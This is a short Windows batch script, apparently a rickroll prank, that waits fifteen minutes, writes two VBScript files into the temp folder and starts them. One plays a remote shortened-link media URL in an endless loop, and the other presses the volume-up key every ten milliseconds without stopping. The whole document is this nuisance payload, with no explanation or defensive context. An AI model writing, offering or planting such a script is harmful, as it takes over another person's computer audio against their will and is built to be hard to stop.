timeout 900

cd %tmp% && copy con rickyou.vbs
While true
Dim oPlayer
Set oPlayer = CreateObject("WMPlayer.OCX")
oPlayer.URL = "http://tinyurl.com/s63ve48"
oPlayer.controls.play
While oPlayer.playState <> 1 ' 1 = Stopped
WScript.Sleep 100
Wend
oPlayer.close
Wend
copy con volup.vbs
do
Set WshShell = CreateObject("WScript.Shell")
WshShell.SendKeys(chr(&hAF))
WScript.Sleep 10
loop
start rickyou.vbs && volup.vbs
exit
